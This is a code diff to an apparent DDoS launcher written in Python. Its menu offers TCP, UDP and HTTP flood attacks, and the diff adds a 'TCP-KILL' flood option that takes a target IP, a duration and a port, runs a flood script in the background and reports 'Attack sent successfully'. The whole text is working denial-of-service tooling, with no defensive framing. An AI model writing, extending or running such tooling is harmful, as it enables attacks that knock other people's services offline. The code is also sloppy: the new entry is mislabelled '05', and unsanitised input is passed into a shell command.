@@ -492,6 +492,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
 		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
+		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" TCP-KILL: TCP FLOOD / HIGH R/s")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -545,6 +546,15 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+				except:
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+			elif option in ['06', '6']:
+				try:
+					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
+					subprocess.run([f'screen -dm node utils/L4/tcp-kill {ip} {floodtime} {port}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
